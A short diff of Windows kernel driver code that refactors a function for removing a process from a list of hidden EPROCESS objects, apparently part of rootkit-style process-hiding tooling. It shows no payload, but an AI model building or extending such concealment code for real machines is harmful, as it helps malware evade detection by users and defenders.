@@ -34,7 +34,7 @@ public:
 
 	BOOL RemoveFromHidden(ULONG64 ProcessId, ULONG HiddenIndex, PEPROCESS* UnhiddenProcess) {
 		PEPROCESS RemoveProcess = NULL;
-		PEPROCESS CurrentProcess = NULL;
+		PACTEPROCESS CurrentProcess = NULL;
 		PVOID TempHidden = NULL;
 		ULONG CurrentIndex = 0;
 		if (BufferSize == 0 || HiddenCount == 0 || HiddenList == NULL) {
@@ -47,7 +47,7 @@ public:
 			}
 			for (CurrentIndex = 0; CurrentIndex < HiddenCount; CurrentIndex++) {
 				RtlCopyMemory(&CurrentProcess, (PVOID)((ULONG64)HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
-				if (*(ULONG64*)((ULONG64)CurrentProcess + EPOF_UniqueProcessId) == ProcessId) {
+				if ((ULONG64)(CurrentProcess->UniqueProcessId) == ProcessId) {
 					HiddenIndex = CurrentIndex;
 					break;
 				}
